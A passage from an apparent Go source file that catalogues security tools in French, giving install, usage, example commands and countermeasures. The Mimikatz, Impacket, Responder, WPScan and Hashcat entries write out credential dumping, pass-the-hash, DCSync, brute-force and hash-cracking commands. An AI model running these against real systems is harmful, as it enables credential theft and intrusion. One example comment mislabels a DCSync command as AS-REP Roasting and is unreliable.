			Examples:    "```bash\n# Scan rapide d'un réseau\nmasscan -p 80,443,22,21 192.168.1.0/24 --rate=1000\n\n# Scan de tous les ports\nmasscan -p 0-65535 10.10.10.1 --rate=10000\n\n# Export XML (compatible Nmap)\nmasscan -p 80,443 10.0.0.0/8 --rate=5000 -oX scan.xml\n\n# Avec bannières\nmasscan -p 80 10.10.10.0/24 --banners\n```",
			Defense:     "**Détection** :\n- Volume de paquets SYN massivement supérieur à la normale\n- IDS/IPS détectent les patterns masscan (TTL, IP ID...)\n\n**Contre-mesures** :\n- Rate limiting sur le firewall\n- Blackholer les IPs sources de scan (fail2ban)",
		},

		// ── Outils Phase 5.3 — OSINT ────────────────────────────────────────────
		{
			Name: "Sherlock", Category: "offensive", SubCategory: "osint",
			EthicalLevel: models.EthicalStandard,
			OS:           "both", Tags: "osint,username,réseaux-sociaux,reconnaissance,hunting",
			Description: "Recherche un nom d'utilisateur sur 400+ réseaux sociaux et sites web. Outil OSINT incontournable pour la reconnaissance d'une cible par son pseudo.",
			Install:     "```bash\n# pip\npipx install sherlock-project\n\n# Ou depuis les sources\ngit clone https://github.com/sherlock-project/sherlock\ncd sherlock && pip3 install .\n```",
			Usage:       "```bash\nsherlock [options] <username> [username2 ...]\n\n--timeout <sec>  # Timeout par requête (défaut: 60)\n--print-found    # Afficher uniquement les trouvés\n--no-color       # Sans couleurs (scripts)\n--output <file>  # Exporter les résultats\n--csv            # Export CSV\n--site <site>    # Limiter à un site\n```",
			Examples:    "```bash\n# Recherche simple\nsherlock john_doe\n\n# Plusieurs pseudos\nsherlock john_doe johndoe john.doe\n\n# Export CSV\nsherlock --csv john_doe\n\n# Timeout réduit + seulement les trouvés\nsherlock --timeout 10 --print-found john_doe\n```",
			Defense:     "**Contre-mesures** :\n- Utiliser des pseudos différents sur chaque plateforme\n- Ne pas lier ses comptes (email unique par plateforme)\n- Vérifier sa propre empreinte numérique régulièrement",
		},
		{
			Name: "theHarvester", Category: "offensive", SubCategory: "osint",
			EthicalLevel: models.EthicalStandard,
			OS:           "both", Tags: "osint,emails,sous-domaines,domaine,reconnaissance,passif",
			Description: "Outil de collecte passive d'informations sur un domaine : emails, sous-domaines, IPs, URLs, employés. Utilise de multiples sources publiques (Google, Shodan, VirusTotal, Hunter.io...).",
			Install:     "```bash\n# Linux\nsudo apt install theharvester\n\n# Depuis les sources (Python)\ngit clone https://github.com/laramies/theHarvester\ncd theHarvester && pip3 install -r requirements.txt\n```",
			Usage:       "```bash\ntheHarvester -d <domaine> -b <sources> [options]\n\n-d <domaine>    # Domaine cible\n-b <sources>    # Sources (google, bing, shodan, all...)\n-l <n>          # Limite de résultats\n-f <fichier>    # Export HTML + XML\n--screenshot    # Screenshots des domaines\n\n# Sources disponibles : anubis, baidu, bevigil, bing, brave,\n#   certspotter, crtsh, dnsdumpster, duckduckgo, fullhunt,\n#   github-code, google, hackertarget, hunter, intelx,\n#   linkedin, otx, rapiddns, shodan, sublist3r, urlscan...\n```",
			Examples:    "```bash\n# Reconnaissance Google + Bing\ntheHarvester -d example.com -b google,bing -l 200\n\n# Toutes les sources\ntheHarvester -d example.com -b all -l 500\n\n# Export HTML\ntheHarvester -d example.com -b google,bing -f recon_example\n\n# Sources passives uniquement (furtif)\ntheHarvester -d example.com -b dnsdumpster,crtsh,urlscan\n```",
			Defense:     "**Contre-mesures** :\n- Pas de correction possible : ces données sont publiques\n- Limiter la publication d'emails dans les pages web (utiliser des formulaires)\n- Surveiller la divulgation de sous-domaines (crtsh.io monitoring)",
		},
		{
			Name: "Maigret", Category: "offensive", SubCategory: "osint",
			EthicalLevel: models.EthicalStandard,
			OS:           "both", Tags: "osint,username,profil,2000-sites,reconnaissance",
			Description: "Fork avancé de Sherlock. Recherche un username sur 2000+ sites et génère des rapports détaillés avec informations de profil extraites (bio, liens, photos). Idéal pour les investigations OSINT profondes.",
			Install:     "```bash\n# pip\npip3 install maigret\n\n# Depuis les sources\ngit clone https://github.com/soxoj/maigret\ncd maigret && pip3 install .\n```",
			Usage:       "```bash\nmaigret [options] <username>\n\n--timeout <sec>    # Timeout\n--retries <n>      # Nombre de retentatives\n-P <n>             # Threads parallèles\n--html             # Rapport HTML\n--pdf              # Rapport PDF\n--json <file>      # Export JSON\n--tags <tags>      # Filtrer par tags (social, gaming...)\n```",
			Examples:    "```bash\n# Recherche complète avec rapport HTML\nmaigret --html john_doe\n\n# Recherche rapide (timeout court)\nmaigret --timeout 5 john_doe\n\n# Rapport PDF détaillé\nmaigret --pdf john_doe\n\n# Filtrer les sites de gaming\nmaigret --tags gaming john_doe\n```",
			Defense:     "**Contre-mesures** :\n- Pseudos uniques par plateforme\n- Auditer régulièrement son empreinte avec ces outils",
		},

		// ── Outils Phase 5.3 — Web Application Security ─────────────────────────
		{
			Name: "OWASP ZAP", Category: "offensive", SubCategory: "web",
			EthicalLevel: models.EthicalElevated,
			OS:           "both", Tags: "web,proxy,scan,owasp,vulnérabilités,spider,actif,passif",
			Description: "Zed Attack Proxy — scanner de sécurité web complet de l'OWASP. Proxy d'interception, spider, scan actif/passif, fuzzer intégré. Référence mondiale pour les tests d'applications web.",
			Install:     "**Windows/Linux/macOS** : https://www.zaproxy.org/download/\n\n```bash\n# Linux (snap)\nsnap install zaproxy --classic\n\n# Docker (mode daemon)\ndocker run -d -p 8080:8080 zaproxy/zap-stable zap.sh -daemon -host 0.0.0.0 -port 8080\n```",
			Usage:       "```bash\n# Mode headless - scan rapide\nzap.sh -cmd -quickurl http://cible.com -quickout report.html\n\n# Mode daemon (API)\nzap.sh -daemon -port 8080 -config api.key=mykey\n\n# Utiliser l'API REST\ncurl 'http://localhost:8080/JSON/spider/action/scan/?url=http://cible.com&apikey=mykey'\n```",
			Examples:    "```bash\n# Scan rapide en ligne de commande\nzap.sh -cmd -quickurl http://10.10.10.1 -quickout /tmp/report.html\n\n# Scan complet avec rapport JSON\nzap.sh -cmd -autorun /path/to/autorun.yaml\n\n# API : lancer un spider\ncurl 'http://localhost:8080/JSON/spider/action/scan/?url=http://cible.com&apikey=mykey'\n\n# API : récupérer les alertes\ncurl 'http://localhost:8080/JSON/alert/view/alerts/?baseurl=http://cible.com&apikey=mykey'\n```",
			Defense:     "**Contre-mesures** :\n- WAF pour bloquer les requêtes malveillantes\n- Rate limiting sur l'application\n- HSTS, CSP, X-Frame-Options, X-Content-Type-Options\n- Tests réguliers avec ZAP en CICD (DAST pipeline)",
		},
		{
			Name: "WPScan", Category: "offensive", SubCategory: "web",
			EthicalLevel: models.EthicalElevated,
			OS:           "both", Tags: "wordpress,cms,scan,plugins,themes,vulnérabilités,users",
			Description: "Scanner de vulnérabilités dédié WordPress. Enumère les plugins, thèmes, utilisateurs et CVE connues. Base de données WPVulnDB mise à jour quotidiennement.",
			Install:     "```bash\n# Ruby gem\ngem install wpscan\n\n# Linux\nsudo apt install wpscan\n```",
			Usage:       "```bash\nwpscan --url <url> [options]\n\n--url <url>           # URL cible WordPress\n--enumerate <opts>    # Enumérer : u=users, p=plugins, t=themes\n--passwords <file>    # Brute force des logins\n--username <user>     # Username pour le brute force\n--api-token <token>   # Token WPVulnDB (CVE)\n```",
			Examples:    "```bash\n# Scan basique\nwpscan --url http://wordpress-site.com\n\n# Enumération des plugins\nwpscan --url http://wordpress-site.com --enumerate p\n\n# Tout énumérer + CVE\nwpscan --url http://wordpress-site.com --enumerate u,p,t --api-token YOUR_TOKEN\n\n# Brute force admin\nwpscan --url http://wordpress-site.com --passwords /wordlists/rockyou.txt --username admin\n```",
			Defense:     "**Contre-mesures** :\n- Masquer la version WordPress (/wp-login.php, générateur meta)\n- Mettre à jour plugins/thèmes/core régulièrement\n- 2FA sur wp-admin\n- Limiter les tentatives de connexion (Wordfence, plugin)\n- Fichier xmlrpc.php désactivé si inutilisé",
		},

		// ── Outils Phase 5.3 — Cloud & Container Security ────────────────────────
		{
			Name: "Trivy", Category: "defensive", SubCategory: "container-security",
			EthicalLevel: models.EthicalStandard,
			OS:           "both", Tags: "container,docker,vulnérabilités,iac,sbom,cve,code,cloud",
			Description: "Scanner de vulnérabilités all-in-one d'Aqua Security. Analyse images Docker, code source, IaC (Terraform/K8s), SBOM et secrets. Référence dans les pipelines DevSecOps.",
			Install:     "```bash\n# Linux (script)\ncurl -sfL https://raw.githubusercontent.com/aquasecurity/trivy/main/contrib/install.sh | sudo sh\n\n# Homebrew (Mac)\nbrew install trivy\n\n# Windows (scoop)\nscoop install trivy\n```",
			Usage:       "```bash\ntrivy <commande> <cible>\n\n# Commandes\nimage <image>        # Scanner une image Docker\nfs <chemin>          # Scanner un répertoire/dépôt\nrepo <url>           # Scanner un repo Git\nk8s                  # Scanner un cluster Kubernetes\nsbom                 # Générer un SBOM\n\n# Options communes\n--severity HIGH,CRITICAL    # Filtrer par sévérité\n--format json|table|sarif  # Format de sortie\n--exit-code 1              # Sortie erreur si vulnérabilité\n```",
			Examples:    "```bash\n# Scanner une image Docker\ntrivy image nginx:latest\n\n# Uniquement les HIGH et CRITICAL\ntrivy image --severity HIGH,CRITICAL python:3.9\n\n# Scanner le code source d'un projet\ntrivy fs /mon/projet\n\n# Scanner un repo GitHub\ntrivy repo https://github.com/user/repo\n\n# Export JSON\ntrivy image --format json -o rapport.json ubuntu:22.04\n\n# Intégration CI : erreur si vulné critique trouvée\ntrivy image --exit-code 1 --severity CRITICAL mon-app:latest\n```",
			Defense:     "**Utilisation défensive** :\n- Intégrer Trivy dans les pipelines CI/CD (GitHub Actions, GitLab CI)\n- Scanner toutes les images avant déploiement\n- Générer des SBOM pour la traçabilité\n- Alerter sur les nouvelles CVE dans les images en production",
		},
		{
			Name: "Prowler", Category: "defensive", SubCategory: "cloud-security",
			EthicalLevel: models.EthicalStandard,
			OS:           "both", Tags: "aws,azure,gcp,cloud,compliance,cis,audit,iam,s3",
			Description: "Outil d'audit de sécurité cloud (AWS, Azure, GCP). Vérifie plus de 500 contrôles CIS, GDPR, HIPAA, PCI-DSS, SOC2. Détecte les mauvaises configurations IAM, S3 publics, CloudTrail désactivé...",
			Install:     "```bash\n# pip\npip3 install prowler\n\n# Ou depuis les sources\ngit clone https://github.com/prowler-cloud/prowler\ncd prowler && pip3 install -r requirements.txt\n```",
			Usage:       "```bash\nprowler <provider> [options]\n\n# Providers : aws, azure, gcp, kubernetes\n\n# AWS\nprowler aws --profile <profil> [options]\n\n-c <checks>        # Checks spécifiques\n--compliance <fw>  # CIS, GDPR, PCI...\n-M json,csv,html  # Formats de sortie\n-f <région>        # Région AWS\n```",
			Examples:    "```bash\n# Audit AWS complet\nprowler aws\n\n# Conformité CIS AWS\nprowler aws --compliance cis_level1_aws\n\n# Export HTML\nprowler aws -M html\n\n# Checks spécifiques S3\nprowler aws -c s3_bucket_public_access\n\n# Azure avec tenant ID\nprowler azure --sp-env-auth\n```",
			Defense:     "**Utilisation** :\n- Audit périodique de la posture de sécurité cloud\n- Intégrer dans les pipelines CI/CD\n- Dashboard de conformité (CIS, PCI-DSS...)\n- Alerter sur les dérives de configuration",
		},
		{
			Name: "Checkov", Category: "defensive", SubCategory: "cloud-security",
			EthicalLevel: models.EthicalStandard,
			OS:           "both", Tags: "iac,terraform,kubernetes,cloudformation,sécurité,devops,shift-left",
			Description: "Analyseur statique de sécurité pour l'Infrastructure-as-Code. Analyse Terraform, CloudFormation, Kubernetes YAML, Dockerfile, Helm charts pour détecter les misconfigurations avant le déploiement.",
			Install:     "```bash\n# pip\npip3 install checkov\n\n# Homebrew\nbrew install checkov\n```",
			Usage:       "```bash\ncheckov -d <répertoire> [options]\ncheckov -f <fichier> [options]\n\n--framework <fw>      # terraform, kubernetes, dockerfile...\n--check <id>          # Checks spécifiques (CKV_AWS_1)\n--skip-check <id>     # Ignorer des checks\n-o json|junitxml|cli  # Format de sortie\n--soft-fail           # Ne pas échouer même si vulné\n```",
			Examples:    "```bash\n# Scanner un répertoire Terraform\ncheckov -d /mon/infra/terraform\n\n# Scanner un fichier Kubernetes\ncheckov -f deployment.yaml\n\n# Rapport JSON\ncheckov -d . -o json\n\n# Intégration CI/CD (GitHub Actions)\ncheckov -d . --soft-fail\n\n# Scanner un Dockerfile\ncheckov -f Dockerfile\n```",
			Defense:     "**Utilisation** :\n- Intégrer dans pre-commit hooks et pipelines CI\n- Empêcher le déploiement d'infra non-conforme\n- Fix automatique disponible pour certains checks (--fix)",
		},

		// ── Outils Phase 5.3 — Forensics & Défense ─────────────────────────────
		{
			Name: "ClamAV", Category: "defensive", SubCategory: "antivirus",
			EthicalLevel: models.EthicalStandard,
			OS:           "both", Tags: "antivirus,malware,scan,fichiers,forensics,linux",
			Description: "Antivirus open source multi-plateforme. Scanner de malware pour fichiers, emails, archives. Utilisé sur les serveurs Linux pour la détection de virus et le forensics de fichiers suspects.",
			Install:     "```bash\n# Linux\nsudo apt install clamav clamav-daemon\n\n# Mise à jour des signatures\nsudo freshclam\n```",
			Usage:       "```bash\nclamscan [options] <cible>\n\n-r                   # Récursif\n--infected           # Afficher uniquement les infectés\n--remove             # Supprimer les fichiers infectés\n--move <dir>         # Quarantaine\n--log <fichier>      # Log des résultats\n--max-filesize=<n>M  # Taille max de fichier à scanner\n```",
			Examples:    "```bash\n# Scanner un répertoire\nclamscan -r /tmp/\n\n# Scanner et n'afficher que les infectés\nclamscan -r --infected /home/\n\n# Scanner avec quarantaine\nclamscan -r --move=/quarantaine /tmp/\n\n# Scan rapide (base seule, sans scan de fichiers)\nclamscan --quick /\n\n# Mettre à jour les signatures\nfreshclam\n```",
			Defense:     "**Utilisation défensive** :\n- Scanner les fichiers uploadés sur les serveurs web\n- Intégrer dans les pipelines CI pour scanner les builds\n- Scanner les emails entrants (Postfix + ClamAV-milter)\n- Cron job quotidien sur les répertoires sensibles",
		},
		{
			Name: "Wazuh Agent", Category: "defensive", SubCategory: "siem-edr",
			EthicalLevel: models.EthicalStandard,
			OS:           "both", Tags: "siem,edr,monitoring,alertes,compliance,fim,intrusion",
			Description: "Agent EDR/SIEM open source. Surveillance de l'intégrité des fichiers (FIM), détection d'intrusion, conformité (PCI-DSS, GDPR, CIS), analyse de logs. S'intègre avec OpenSearch/Elastic.",
			Install:     "```bash\n# Ajout du dépôt Wazuh\ncurl -s https://packages.wazuh.com/key/GPG-KEY-WAZUH | gpg --dearmor -o /etc/apt/trusted.gpg.d/wazuh.gpg\necho 'deb https://packages.wazuh.com/4.x/apt/ stable main' > /etc/apt/sources.list.d/wazuh.list\nsudo apt update && sudo apt install wazuh-agent\n\n# Configuration\n# Éditer /var/ossec/etc/ossec.conf avec l'IP du manager\nsudo systemctl enable --now wazuh-agent\n```",
			Usage:       "**Commandes principales** :\n```bash\n# Statut de l'agent\nsudo /var/ossec/bin/wazuh-control status\n\n# Tester une règle\nsudo /var/ossec/bin/ossec-logtest\n\n# Vérifier les alertes\ntail -f /var/ossec/logs/alerts/alerts.log\n```\n\n**Fichiers importants** :\n```\n/var/ossec/etc/ossec.conf    # Configuration\n/var/ossec/logs/alerts/      # Alertes\n/var/ossec/logs/ossec.log    # Logs agent\n```",
			Examples:    "```bash\n# Lancer la surveillance FIM (File Integrity Monitoring)\n# Dans ossec.conf :\n# <directories check_all=\"yes\">/etc,/usr/bin,/bin</directories>\n\n# Vérifier la connexion au manager\nsudo /var/ossec/bin/agent_control -l\n\n# Déclencher un test d'alerte\necho \"test alert\" | sudo tee /var/ossec/logs/active-responses.log\n```",
			Defense:     "",
		},

		// ── Outils Phase 5.3 — Reverse Engineering ─────────────────────────────
		{
			Name: "Ghidra", Category: "defensive", SubCategory: "reverse-engineering",
			EthicalLevel: models.EthicalStandard,
			OS:           "both", Tags: "reverse,désassembleur,décompilateur,malware,binaire,nsa",
			Description: "Suite de reverse engineering développée par la NSA. Désassembleur et décompilateur multi-architecture (x86, ARM, MIPS...). Analyse statique de binaires et malware. Gratuit et open source.",
			Install:     "**Windows/Linux/macOS** : https://ghidra-sre.org/\n\n```bash\n# Prérequis : Java 17+\nsudo apt install openjdk-17-jdk\n\n# Télécharger depuis https://github.com/NationalSecurityAgency/ghidra/releases\nunzip ghidra_*.zip\n./ghidraRun\n```",
			Usage:       "**Interface graphique** :\n1. Créer un projet → Import File (binaire à analyser)\n2. Double-clic pour analyser automatiquement\n3. Onglet Decompiler : vue pseudo-code C\n4. Onglet Listing : vue assembleur\n\n**Raccourcis** :\n- `G` → Aller à une adresse\n- `L` → Renommer une fonction/variable\n- `Ctrl+F` → Rechercher\n- `T` → Ajouter un type",
			Examples:    "```bash\n# Mode headless (script)\nanalyzeHeadless /tmp/projet MonProjet -import binaire.exe -postScript PrintTrees.java\n\n# Analyser un binaire sans GUI\nanalyzeHeadless /tmp/projet MonProjet -import malware.exe -overwrite\n```",
			Defense:     "**Utilisation défensive** :\n- Analyse de malware capturé\n- Validation de binaires suspects\n- CTF (challenge reverse engineering)\n- Recherche de CVE dans des binaires fermés",
		},
		// ── Outils supplémentaires (30) ─────────────────────────────────────────────
		{
			Name: "BloodHound", Category: "offensive", SubCategory: "active-directory",
			EthicalLevel: models.EthicalElevated,
			OS:           "both", Tags: "ad,active-directory,graph,attack-path,bloodhound",
			Description: "Outil de cartographie des relations dans Active Directory. Utilise des graphes pour visualiser les chemins d'attaque (privilèges, trusts, ACLs) et identifier les vecteurs d'escalade de privilèges.",
			Install:     "```bash\n# Linux (SharpHound collector)\n# Télécharger SharpHound depuis https://github.com/BloodHoundAD/BloodHound/releases\n# Collecte : SharpHound.exe -c All\n\n# BloodHound UI (nécessite Neo4j)\ndocker run -p 7474:7474 -p 7687:7687 -e NEO4J_AUTH=neo4j/changeme neo4j\n# Puis lancer BloodHound\n```",
			Usage:       "**Collecte** :\n```powershell\n# SharpHound (PowerShell)\n.\\SharpHound.exe -c All --DomainController dc.domain.local\n```\n\n**Analyse** :\n- Charger les JSON dans BloodHound\n- Requêtes prédéfinies : \"Find Shortest Paths to Domain Admins\", \"Find Kerberoastable Users\"\n- Requêtes Cypher personnalisées",
			Examples:    "```bash\n# Collecte avec SharpHound (Linux via bloodhound-python)\npipx install bloodhound\nbloodhound-python -d domain.local -u user -p pass -ns 10.10.10.1 -c All\n\n# Import des résultats dans BloodHound UI\n# DB : https://localhost:7474 (neo4j)\n```",
			Defense:     "**Contre-mesures** :\n- Limiter les droits d'exécution des outils de collecte (AMSI, logging)\n- Tiering AD et bastions\n- Supprimer les comptes avec délégation non contrainte\n- Audit des chemins BloodHound avec des scripts maison",
		},
		{
			Name: "Mimikatz", Category: "offensive", SubCategory: "active-directory",
			EthicalLevel: models.EthicalWarning,
			OS:           "windows", Tags: "credentials,mimikatz,lsass,pass-the-hash,kerberos",
			Description: "Outil post-exploitation Windows pour extraire des credentials en mémoire (LSASS), effectuer du pass-the-hash, du pass-the-ticket, et manipuler des tickets Kerberos. Très utilisé en pentest AD.",
			Install:     "```powershell\n# Télécharger depuis https://github.com/gentilkiwi/mimikatz/releases\n# Exécuter en tant qu'Administrateur\nmimikatz.exe\n```",
			Usage:       "```bash\n# Commandes de base dans mimikatz\nprivilege::debug          # Élever les privilèges\nsekurlsa::logonpasswords  # Extraire les mots de passe en clair\nsekurlsa::tickets         # Lister les tickets Kerberos\nlsadump::sam              # Dumper SAM\nlsadump::lsa /inject      # Dumper LSA\ntoken::elevate            # S'élever SYSTEM\n```",
			Examples:    "```powershell\n# Pass-the-hash\nsekurlsa::pth /user:administrator /domain:domain.local /ntlm:31d6cfe0d16ae931b73c59d7e0c089c0\n\n# Pass-the-ticket\nkerberos::ptt ticket.kirbi\n\n# Détection de comptes sans pré-auth (AS-REP Roasting)\nlsadump::dcsync /user:krbtgt\n```",
			Defense:     "**Détection** :\n- EDR détectent les accès à LSASS\n- Logs Event ID 4656, 4663 (accès LSASS)\n- Windows Defender ATP alerte sur Mimikatz\n\n**Contre-mesures** :\n- Activer Credential Guard (Windows 10/Server 2016+)\n- Limiter les comptes admin locaux\n- Détection des comportements suspicious (procdump, Task Manager)",
		},
		{
			Name: "Responder", Category: "offensive", SubCategory: "network",
			EthicalLevel: models.EthicalElevated,
			OS:           "linux", Tags: "llmnr,netbios,ntlm,poisoning,hash-capture",
			Description: "Outil d'empoisonnement LLMNR/NBT-NS pour capturer des hash NTLMv2 sur un réseau local. Lorsqu'un client demande une ressource inexistante, Responder répond avec un faux service pour capturer l'authentification.",
			Install:     "```bash\n# Linux\ngit clone https://github.com/lgandx/Responder\ncd Responder\n```",
			Usage:       "```bash\nsudo responder -I eth0 -wv\n\n# Options\n-I <interface>   # Interface réseau\n-w              # Activer WPAD (proxy auto-discovery)\n-v              # Verbose\n-d              # Activer DHCP\n```",
			Examples:    "```bash\n# Capture basique\nsudo responder -I eth0 -w\n\n# Capture pour analyse ultérieure\nsudo responder -I eth0 -w -F -v\n\n# Ne pas répondre pour certains protocoles (ex: SMB)\nsudo responder -I eth0 -w --no-smb\n```",
			Defense:     "**Contre-mesures** :\n- Désactiver LLMNR et NetBIOS via GPO\n- Forcer le signing SMB (empêche le relais)\n- Mettre en place une politique de mot de passe fort (hash NTLM incassables)\n- Utiliser des comptes avec des mots de passe longs et aléatoires",
		},
		{
			Name: "Impacket", Category: "offensive", SubCategory: "active-directory",
			EthicalLevel: models.EthicalElevated,
			OS:           "both", Tags: "python,smb,winrm,ad,impacket,network-protocols",
			Description: "Collection de scripts Python pour la manipulation des protocoles réseau (SMB, WinRM, Kerberos, LDAP, WMI). Permet le mouvement latéral, l'exécution de commandes distantes et l'extraction de données Active Directory.",
			Install:     "```bash\n# pip\npip3 install impacket\n\n# Ou depuis les sources\ngit clone https://github.com/SecureAuthCorp/impacket\ncd impacket && pip3 install .\n```",
			Usage:       "```bash\n# Exemples de scripts\npsexec.py domain/user@target -hashes :ntlm_hash\nwmiexec.py domain/user@target -hashes :ntlm_hash\nsmbclient.py domain/user@target -list\nsecretsdump.py domain/user@target -hashes :ntlm_hash\n```",
			Examples:    "```bash\n# Psexec pour cmd interactif\npsexec.py administrator@10.10.10.1 -hashes aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0\n\n# Dump du SAM distants\nsecretsdump.py domain/user@10.10.10.1 -hashes :ntlm_hash\n\n# SMB partage\nsmbclient.py domain/user@10.10.10.1 -share 'C$' -hashes :ntlm_hash\n```",
			Defense:     "**Détection** :\n- Logs d'échec/authentification SMB répétés\n- Event IDs 4624 (logon), 5140 (partage)\n- Outils comme `psexec` génèrent des services temporaires détectables\n\n**Contre-mesures** :\n- Désactiver SMBv1\n- Network Level Authentication (NLA) pour RDP\n- Restreindre l'utilisation de WMI/WinRM\n- Monitoring de la création de services",
		},
		{
			Name: "Autopsy", Category: "defensive", SubCategory: "forensics",
			EthicalLevel: models.EthicalStandard,
			OS:           "both", Tags: "forensics,disk,analysis,carving,file-recovery,ui",
			Description: "Interface graphique pour The Sleuth Kit (TSK). Analyse de disques, récupération de fichiers supprimés, analyse de registre, extraction de timeline. Idéal pour le forensics numérique.",
			Install:     "**Windows/Linux** : https://www.sleuthkit.org/autopsy/download.php\n\n```bash\n# Linux (via apt)\nsudo apt install autopsy\n```",
			Usage:       "**Interface web** : Lancer Autopsy, créer un nouveau cas, ajouter une image disque (E01, dd, raw).\n\n**Fonctionnalités** :\n- Analyse des systèmes de fichiers (NTFS, FAT, ext4)\n- Récupération de fichiers par signature (carving)\n- Recherche de mots-clés, extraction de métadonnées\n- Timeline des événements",
			Examples:    "```bash\n# Analyse d'une image disque\nautopsy /path/to/case -d /path/to/image.dd\n\n# En ligne de commande (tsk)\ntsk_recover -e /dev/sda1 output_dir\n```",
			Defense:     "",
		},
		{
			Name: "Hashcat", Category: "offensive", SubCategory: "password-cracking",
			EthicalLevel: models.EthicalWarning,
			OS:           "both", Tags: "hash,crack,gpu,password,wordlist,bruteforce",
			Description: "Casseur de hash ultra-rapide via GPU (OpenCL/CUDA). Supporte plus de 300 formats de hash (MD5, SHA, NTLM, bcrypt, WPA2). Utilisé pour les tests de robustesse des mots de passe.",
			Install:     "```bash\n# Linux\nsudo apt install hashcat\n\n# Binaires officiels : https://hashcat.net/hashcat/\n```",
			Usage:       "```bash\nhashcat -m <type> -a <attackmode> hash.txt wordlist.txt\n\n# Types courants\n-m 0    # MD5\n-m 1000 # NTLM\n-m 5600 # NetNTLMv2\n-m 2500 # WPA/EAPOL\n\n# Attack modes\n-a 0    # Wordlist\n-a 3    # Brute force mask\n-a 6    # Wordlist + mask\n```",
			Examples:    "```bash\n# Crack MD5 avec rockyou\nhashcat -m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.txt\n\n# Brute force mask (8 caractères alphanumériques)\nhashcat -m 0 -a 3 hash.txt ?l?l?l?l?l?l?l?l\n\n# NTLM avec règles\nhashcat -m 1000 -a 0 ntlm.txt rockyou.txt -r rules/best64.rule\n\n# Montrer les résultats\nhashcat -m 0 hash.txt --show\n```",
			Defense:     "**Contre-mesures** :\n- Utiliser des mots de passe longs (≥12) et complexes\n- Salage fort (bcrypt/Argon2)\n- Politique de verrouillage après 5 tentatives\n- Rotation régulière des mots de passe",
		},
		{
			Name: "Burp Suite Community", Category: "offensive", SubCategory: "web",
			EthicalLevel: models.EthicalElevated,
			OS:           "both", Tags: "proxy,web,intercept,scan,repeater,intruder",
			Description: "Proxy d'interception web incontournable pour les tests d'intrusion. Permet d'intercepter, modifier et rejouer des requêtes HTTP/HTTPS, avec des outils intégrés (Repeater, Intruder, Spider, Scanner).",
			Install:     "**Télécharger** : https://portswigger.net/burp/releases\n\n```bash\n# Linux (portable)\njava -jar burp.jar\n```",
			Usage:       "**Configuration du proxy** : Navigateur → proxy localhost:8080, installer le certificat CA de Burp pour HTTPS.\n\n**Principaux onglets** :\n- Proxy → Intercept (modifier en vol)\n- Repeater (rejouer manuellement)\n- Intruder (brute force paramètres)\n- Scanner (détection auto vulnérabilités)",
			Examples:    "```bash\n# Lancer Burp sans GUI (headless)\njava -jar burp.jar -Djava.awt.headless=true\n\n# Utiliser l'API REST (Professional)\ncurl -X GET \"http://localhost:1337/v0.1/scan/status\"\n```",
			Defense:     "**Détection** :\n- Headers de requêtes Burp (User-Agent, custom header)\n- Détection par WAF (pattern de fuzzing)\n\n**Contre-mesures** :\n- WAF avec règles pour bloquer les scanners\n- Rate limiting\n- Utilisation de CSRF tokens, captcha\n- Pinning des certificats (application mobile)",
		},
		{
			Name: "OpenVAS", Category: "defensive", SubCategory: "vulnerability-scanner",
			EthicalLevel: models.EthicalStandard,
			OS:           "linux", Tags: "scan,vulnérabilités,cve,gvm,scanner,openvas",
			Description: "Scanner de vulnérabilités open source (Greenbone Vulnerability Management). Détecte les CVE, mauvaises configurations, mots de passe faibles, etc. Base de règles NVT régulièrement mise à jour.",
			Install:     "```bash\n# Docker\ndocker run -d -p 443:443 --name openvas mikesplain/openvas\n\n# Installation classique (GVM)\nsudo apt install gvm\nsudo gvm-setup\n```",
			Usage:       "**Interface web** : https://localhost:9392 (admin/changeme après setup)\n\n**Workflow** :\n1. Créer une cible (IP ou plage)\n2. Lancer un scan (rapide ou complet)\n3. Analyser le rapport (CVE, score CVSS, recommandations)",
			Examples:    "```bash\n# En ligne de commande (gvm-cli)\ngvm-cli --gmp-username admin --gmp-password pass --hostname localhost --xml \"<create_target>...\"\n\n# Automatisation avec python-gvm\n```",
			Defense:     "**Utilisation** :\n- Scanner régulièrement son parc\n- Prioriser les correctifs selon CVSS\n- Intégrer les résultats dans le SIEM",
		},
		{
			Name: "Snort", Category: "defensive", SubCategory: "ids-ips",
			EthicalLevel: models.EthicalStandard,
			OS:           "linux", Tags: "ids,ips,snort,réseau,alertes,règles",
			Description: "Système de détection d'intrusion réseau (IDS/IPS) open source historique. Analyse le trafic en temps réel selon des règles et génère des alertes. La base VRT est payante, mais la communauté fournit des règles.",
			Install:     "```bash\nsudo apt install snort\n\n# Configurer /etc/snort/snort.conf (réseau local)\n```",
			Usage:       "```bash\n# Mode IDS (enregistre les alertes dans /var/log/snort/)\nsudo snort -q -c /etc/snort/snort.conf -i eth0\n\n# Mode IPS inline (nécessite que snort soit placé entre deux interfaces)\nsudo snort -Q -c /etc/snort/snort.conf\n\n# Analyser un pcap\nsnort -r capture.pcap -c /etc/snort/snort.conf\n```",
			Examples:    "```bash\n# Tester une règle personnalisée\necho 'alert icmp any any -> any any (msg:\"ICMP Test\"; sid:1000001;)' >> local.rules\nsudo snort -A console -c /etc/snort/snort.conf -r test.pcap\n```",
			Defense:     "",
		},
		{
			Name: "Kismet", Category: "offensive", SubCategory: "wifi",
			EthicalLevel: models.EthicalElevated,
			OS:           "linux", Tags: "wifi,802.11,wardriving,detection,wireless",
			Description: "Détecteur de réseaux Wi-Fi et Bluetooth. Capture des paquets, identifie les points d'accès cachés, les clients, et peut passer en mode monitor. Idéal pour l'audit sans fil.",
			Install:     "```bash\nsudo apt install kismet\n\n# Lancer le serveur\nkismet -c wlan0mon\n```",
			Usage:       "**Interface web** : http://localhost:2501 (par défaut)\n\n**Commandes** :\n- `kismet -c <interface>` : démarrer capture\n- `kismet -i pcap://capture.pcap` : analyser un fichier",
			Examples:    "```bash\n# Démarrer avec interface en mode monitor\nsudo airmon-ng start wlan0\nsudo kismet -c wlan0mon\n\n# Lire un pcap\nkismet -i pcap://file.pcap\n```",
			Defense:     "**Contre-mesures** :\n- Utiliser WPA3\n- Désactiver le broadcasting SSID (camouflage faible)\n- Surveiller les réseaux avec des sondes Kismet",
		},
		{
			Name: "CyberChef", Category: "defensive", SubCategory: "forensics",
			EthicalLevel: models.EthicalStandard,
			OS:           "both", Tags: "encoding,encryption,decoding,forensics,recipe",
